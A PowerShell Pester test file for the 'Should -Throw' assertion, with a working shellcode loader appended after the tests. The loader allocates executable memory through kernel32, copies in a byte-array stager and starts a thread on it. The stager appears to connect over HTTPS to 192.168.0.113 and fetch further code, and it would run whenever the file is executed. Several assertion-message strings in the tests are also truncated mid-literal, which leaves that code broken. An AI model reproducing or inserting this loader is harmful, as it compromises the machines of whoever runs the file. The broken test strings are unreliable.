Set-StrictMode -Version Latest

InModuleScope Pester {
    Describe "Should -Throw" {
        Context "Basic functionality" {
            It "given scriptblock that throws an exception it passes" {
                { throw } | Should -Throw
            }

            It "given scriptblock that throws an exception is passes - legacy syntax" {
                { throw } | Should Throw
            }

            It "given scriptblock that does not throw an exception it fails" {
                { { 1 + 1 } | Should -Throw } | Verify-AssertionFailed
            }

            It "given scriptblock that does not throw an exception it fails - legacy syntax" {
                { { 1 + 1 } | Should Throw } | Verify-AssertionFailed
            }

            It "throws ArgumentException if null ScriptBlock is provided" {
                $err = { $null | Should -Throw } | Verify-Throw
                $err.Exception | Verify-Type ([System.ArgumentException])
            }

            It "throws ArgumentException if null ScriptBlock is provided - legacy syntax" {
                $err = { $null | Should Throw } | Verify-Throw
                $err.Exception | Verify-Type ([System.ArgumentException])
            }

            It "returns error when -PassThru is specified" {
                $err = { throw } | Should -Throw -PassThru
                $err | Verify-NotNull
                $err.Exception | Verify-Type ([System.Management.Automation.RuntimeException])
            }
        }

        Context "Matching error message" {
            It "given scriptblock that throws exception with the expected message it passes" {
                $expectedErrorMessage = "expected error message"
                { throw $expectedErrorMessage } | Should -Throw -ExpectedMessage $expectedErrorMessage
            }

            It "given scriptblock that throws exception with the expected message it passes - legacy syntax" {
                $expectedErrorMessage = "expected error message"
                { throw $expectedErrorMessage } | Should Throw $expectedErrorMessage
            }

            It "given scriptblock that throws exception with the expected message in UPPERCASE it passes" {
                $expectedErrorMessage = "expected error message"
                $errorMessage = $expectedErrorMessage.ToUpperInvariant()
                { throw $errorMessage } | Should -Throw -ExpectedMessage $expectedErrorMessage
            }

            It "given scriptblock that throws exception with the expected message in UPPERCASE it passes - legacy syntax" {
                $expectedErrorMessage = "expected error message"
                $errorMessage = $expectedErrorMessage.ToUpperInvariant()
                { throw $errorMessage } | Should Throw $expectedErrorMessage
            }

            It "given scriptblock that throws exception with a different message it fails" {
                $expectedErrorMessage = "expected error message"
                $unexpectedErrorMessage = "different error message"
                { { throw $unexpectedErrorMessage } | Should -Throw -ExpectedMessage $expectedErrorMessage } | Verify-AssertionFailed
            }

            It "given scriptblock that throws exception with a different message it fails - legacy syntax" {
                $expectedErrorMessage = "expected error message"
                $unexpectedErrorMessage = "different error message"
                { { throw $unexpectedErrorMessage } | Should Throw $expectedErrorMessage } | Verify-AssertionFailed
            }

            It "given scriptblock that throws exception with message that contains the expected message it passes" {
                { throw 'expected error' } | Should -Throw -ExpectedMessage 'error'
            }

            It "given scriptblock that throws exception with message that contains the expected message it passes - legacy syntax" {
                { throw 'expected error' } | Should Throw 'error'
            }
        }

        Context "Matching ErrorId (FullyQualifiedErrorId)" {
            It "given scriptblock that throws exception with FullyQualifiedErrorId with the expected ErrorId it passes" {
                $expectedErrorId = "expected error id"
                $ScriptBlock = {
                    $errorRecord = New-Object System.Management.Automation.ErrorRecord(
                        (New-Object Exception),
                        $expectedErrorId,
                        'OperationStopped',
                        $null
                    )
                    throw $errorRecord
                }

                $ScriptBlock | Should -Throw -ErrorId $expectedErrorId
            }

            It "given scriptblock that throws exception with FullyQualifiedErrorId that contains the expected ErrorId it passes" {
                $expectedErrorId = "error id"
                $ScriptBlock = {
                    $errorRecord = New-Object System.Management.Automation.ErrorRecord(
                        (New-Object Exception),
                        "specific error id",
                        'OperationStopped',
                        $null
                    )
                    throw $errorRecord
                }

                $ScriptBlock | Should -Throw -ErrorId $expectedErrorId
            }

            It "given scriptblock that throws exception with FullyQualifiedErrorId that is different from the expected ErrorId it fails" {
                $unexpectedErrorId = "different error id"
                $expectedErrorId = "expected error id"

                $ScriptBlock = {
                    $errorRecord = New-Object System.Management.Automation.ErrorRecord(
                        (New-Object Exception),
                        $unexpectedErrorId,
                        'OperationStopped',
                        $null
                    )
                    throw $errorRecord
                }

                { $ScriptBlock | Should -Throw -ErrorId $expectedErrorId } | Verify-AssertionFailed
            }
        }

        Context 'Matching exception type' {
            It "given scriptblock that throws exception with the expected type it passes" {
                { throw [System.ArgumentException]"message" } | Should -Throw -ExceptionType ([System.ArgumentException])
            }

            It "given scriptblock that throws exception with a sub-type of the expected type it passes" {
                { throw [ArgumentNullException]"message" } | Should -Throw -ExceptionType ([System.ArgumentException])
            }

            It "given scriptblock that throws errorrecord with the expected exception type it passes" {
                $ScriptBlock = {
                    $errorRecord = New-Object System.Management.Automation.ErrorRecord(
                        (New-Object System.ArgumentException),
                        "id",
                        'OperationStopped',
                        $null
                    )
                    throw $errorRecord
                }

                $ScriptBlock | Should -Throw -ExceptionType ([System.ArgumentException])
            }

            It "given scriptblock that throws exception with a different type than the expected type it fails" {
                { { throw [System.InvalidOperationException]"message" } | Should -Throw -ExceptionType ([System.ArgumentException]) } | Verify-AssertionFailed
            }

            It "given scriptblock that throws errorrecord with a different exception type it fails" {
                $ScriptBlock = {
                    $errorRecord = New-Object System.Management.Automation.ErrorRecord(
                        (New-Object System.InvalidOperationException),
                        "id",
                        'OperationStopped',
                        $null
                    )
                    throw $errorRecord
                }

                { $ScriptBlock | Should -Throw -ExceptionType ([System.ArgumentException]) } | Verify-AssertionFailed
            }
        }

        Context 'Assertion messages' {
            It 'returns the correct assertion message when no exception is thrown' {
                $err = { { } | Should -Throw } | Verify-AssertionFailed
                $err.Exception.Message | Verify-Equal "Expected an exception, to be thrown, but no exception was thrown."
            }

            It 'returns the correct assertion message when type filter is used, but no exception is thrown' {
                $err = { { } | Should -Throw -ExceptionType ([System.ArgumentException]) } | Verify-AssertionFailed
                $err.Exception.Message | Verify-Equal "Expected an exception, with type [System.ArgumentException] to be thrown, but no exception was thrown."
            }

            It 'returns the correct assertion message when message filter is used, but no exception is thrown' {
                $err = { { } | Should -Throw -ExpectedMessage 'message' } | Verify-AssertionFailed
                $err.Exception.Message | Verify-Equal "Expected an exception, with message 'message' to be thrown, but no exception was thrown."
            }

            It 'returns the correct assertion message when errorId filter is used, but no exception is thrown' {
                $err = { { } | Should -Throw -ErrorId 'id' } | Verify-AssertionFailed
                $err.Exception.Message | Verify-Equal "Expected an exception, with FullyQualifiedErrorId 'id' to be thrown, but no exception was thrown."
            }

            It 'returns the correct assertion message when exceptions messages differ' {
                $testScriptPath = Join-Path $TestDrive.FullName test.ps1
                Set-Content -Path $testScriptPath -Value "throw 'error1'"

                
                $assertionMessage = "Expected an exception, with message 'error2' to be thrown, but the message was 'error1'. from 

                $err = { { & $testScriptPath } | Should -Throw -ExpectedMessage error2 } | Verify-AssertionFailed
                $err.Exception.Message -replace "(`r|`n)" -replace '\s+', ' ' -replace '(char:).*$', '$1' | Verify-Equal $assertionMessage
            }

            It 'returns the correct assertion message when reason is specified' {
                $testScriptPath = Join-Path $TestDrive.FullName test.ps1
                Set-Content -Path $testScriptPath -Value "throw 'error1'"

                
                $assertionMessage = "Expected an exception, with message 'error2' to be thrown, because reason, but the message was 'error1'. from 

                $err = { { & $testScriptPath } | Should -Throw -ExpectedMessage error2 -Because 'reason' } | Verify-AssertionFailed
                $err.Exception.Message -replace "(`r|`n)" -replace '\s+', ' ' -replace '(char:).*$', '$1' | Verify-Equal $assertionMessage
            }

            Context "parameter combintation, returns the correct assertion message" {
                It "given scriptblock that throws an exception where <notMatching> parameter(s) don't match, it fails with correct assertion message$([System.Environment]::NewLine)actual:   id <actualId>, message <actualMess>, type <actualType>$([System.Environment]::NewLine)expected: id <expectedId>, message <expectedMess> type <expectedType>" -TestCases @(
                    @{  actualId = "-id"; actualMess = "+mess"; actualType = ([System.InvalidOperationException])
                        expectedId = "+id"; expectedMess = "+mess"; expectedType = ([System.InvalidOperationException])
                        notMatching = 1; assertionMessage = "Expected an exception, with type [System.InvalidOperationException], with message '+mess' and with FullyQualifiedErrorId '+id' to be thrown, but the FullyQualifiedErrorId was '-id'. from 
                    }

                    @{  actualId = "-id"; actualMess = "-mess"; actualType = ([System.InvalidOperationException])
                        expectedId = "+id"; expectedMess = "+mess"; expectedType = ([System.InvalidOperationException])
                        notMatching = 2; assertionMessage = "Expected an exception, with type [System.InvalidOperationException], with message '+mess' and with FullyQualifiedErrorId '+id' to be thrown, but the message was '-mess' and the FullyQualifiedErrorId was '-id'. from 
                    }

                    @{  actualId = "+id"; actualMess = "-mess"; actualType = ([System.ArgumentException])
                        expectedId = "+id"; expectedMess = "+mess"; expectedType = ([System.InvalidOperationException])
                        notMatching = 2; assertionMessage = "Expected an exception, with type [System.InvalidOperationException], with message '+mess' and with FullyQualifiedErrorId '+id' to be thrown, but the exception type was [System.ArgumentException] and the message was '-mess'. from 
                    }

                    @{  actualId = "-id"; actualMess = "+mess"; actualType = ([System.ArgumentException])
                        expectedId = "+id"; expectedMess = "+mess"; expectedType = ([System.InvalidOperationException])
                        notMatching = 2; assertionMessage = "Expected an exception, with type [System.InvalidOperationException], with message '+mess' and with FullyQualifiedErrorId '+id' to be thrown, but the exception type was [System.ArgumentException] and the FullyQualifiedErrorId was '-id'. from 
                    }

                    @{  actualId = "-id"; actualMess = "-mess"; actualType = ([System.ArgumentException])
                        expectedId = "+id"; expectedMess = "+mess"; expectedType = ([System.InvalidOperationException])
                        notMatching = 3; assertionMessage = "Expected an exception, with type [System.InvalidOperationException], with message '+mess' and with FullyQualifiedErrorId '+id' to be thrown, but the exception type was [System.ArgumentException], the message was '-mess' and the FullyQualifiedErrorId was '-id'. from 
                    }
                ) {
                    param ($actualId, $actualMess, $actualType,
                        $expectedId, $expectedMess, $expectedType,
                        $notMatching, $assertionMessage)

                    $exception = New-Object ($actualType.FullName) $actualMess
                    $errorRecord = New-Object System.Management.Automation.ErrorRecord (
                        $exception,
                        $actualId,
                        'OperationStopped',
                        $null
                    )

                    
                    $testScriptPath = Join-Path $TestDrive.FullName test.ps1
                    Set-Content -Path $testScriptPath -Value "
                        `$errorRecord = New-Object System.Management.Automation.ErrorRecord(
                            (New-Object $($actualType.FullName) '$actualMess'),
                            '$actualId',
                            'OperationStopped',
                            `$null
                        )
                        throw `$errorRecord
                    "

                    
                    $err = { & $testScriptPath } | Verify-Throw

                    $err.FullyQualifiedErrorId | Verify-Equal $actualId
                    $err.Exception | Verify-Type $actualType
                    $err.Exception.Message | Verify-Equal $actualMess

                    
                    $assertionMessage = $assertionMessage -replace "

                    
                    $err = { { & $testScriptPath } | Should -Throw -ExpectedMessage $expectedMess -ErrorId $expectedId -ExceptionType $expectedType } | Verify-AssertionFailed
                    
                    
                    $err.Exception.Message -replace "(`r|`n)" -replace '\s+', ' ' -replace '(char:).*$', '$1' | Verify-Equal $assertionMessage
                }
            }
        }
    }

    Describe "Should -Not -Throw" {
        Context "Basic functionality" {
            It "given scriptblock that does not throw an exception it passes" {
                { } | Should -Not -Throw
            }

            It "given scriptblock that does not throw an exception it passes - legacy syntax" {
                { } | Should Not Throw
            }

            It "given scriptblock that throws an exception it fails" {
                { { throw } | Should -Not -Throw } | Verify-AssertionFailed
            }

            It "given scriptblock that throws an exception it fails - legacy syntax" {
                { { throw } | Should Not Throw } | Verify-AssertionFailed
            }

            It "given scriptblock that throws an exception it fails, even if the messages match " {
                { { throw "message" } | Should -Not -Throw -ExpectedMessage "message" } | Verify-AssertionFailed
            }

            
            
            
            It "given scriptblock that throws an exception it fails, even if the messages match - legacy syntax" {
                { { throw "message" } | Should Not Throw "message" } | Verify-AssertionFailed
            }

            It "given scriptblock that throws an exception it fails, even if the messages do not match " {
                { { throw "dummy" } | Should -Not -Throw -ExpectedMessage "message" } | Verify-AssertionFailed
            }

            It "given scriptblock that throws an exception it fails, even if the messages do not match - legacy syntax" {
                { { throw "dummy" } | Should Not Throw "message" } | Verify-AssertionFailed
            }

            It "throws ArgumentException if null ScriptBlock is provided" {
                $err = { $null | Should -Not -Throw  } | Verify-Throw
                $err.Exception | Verify-Type ([System.ArgumentException])
            }

            It "throws ArgumentException if null ScriptBlock is provided - legacy syntax" {
                $err = { $null | Should Not Throw } | Verify-Throw
                $err.Exception | Verify-Type ([System.ArgumentException])
            }
        }

        Context 'Assertion messages' {
            It 'returns the correct assertion message when an exception is thrown' {
                $err = { { throw } | Should -Not -Throw -Because 'reason' } | Verify-AssertionFailed
                write-host ($err.Exception.Message -replace "(.*)", '')
                $err.Exception.Message -replace "(`r|`n)" -replace '\s+', ' ' -replace ' "ScriptHalted"', '' -replace " from.*" | Verify-Equal "Expected no exception to be thrown, because reason, but an exception was thrown"
            }
        }
    }

    Describe "Get-DoMessagesMatch" {
        It "given the same messages it returns true" {
            $message = "expected"
            Get-DoValuesMatch $message $message | Verify-True
        }

        It "given different messages it returns false" {
            Get-DoValuesMatch "unexpected" "some expected message" | Verify-False
        }

        It "given no expectation it returns true" {
            Get-DoValuesMatch "any error message"  | Verify-True
        }

        It "given empty message and no expectation it returns true" {
            Get-DoValuesMatch ""   | Verify-True
        }


        It "given empty message and empty expectation it returns true" {
            Get-DoValuesMatch "" "" | Verify-True
        }

        It "given message that contains the expectation it returns true" {
            Get-DoValuesMatch "this is a long error message" "long error" | Verify-True
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,0xe8,0x8c,0x00,0x00,0x00,0x2f,0x45,0x6c,0x36,0x48,0x2d,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe0,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x0a,0x4f,0x75,0xd9,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcd,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x75,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x30,0x2e,0x31,0x31,0x33,0x00;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

